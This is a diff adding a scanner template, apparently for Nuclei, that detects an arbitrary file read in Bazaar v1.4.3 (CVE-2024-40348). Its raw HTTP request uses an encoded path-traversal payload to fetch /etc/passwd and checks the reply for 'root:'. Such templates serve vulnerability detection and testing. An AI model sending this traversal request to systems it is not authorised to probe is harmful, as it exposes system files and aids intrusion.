@@ -1,0 +1,23 @@
+id: Bazaar-v1_4_3-File-reading
+
+info:
+  name: Bazaar v1.4.3 任意文件读取漏洞(CVE-2024-40348)
+  author: unknown
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /api/swaggerui/static/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:'
+      - type: status
+        status: 
+          - 200
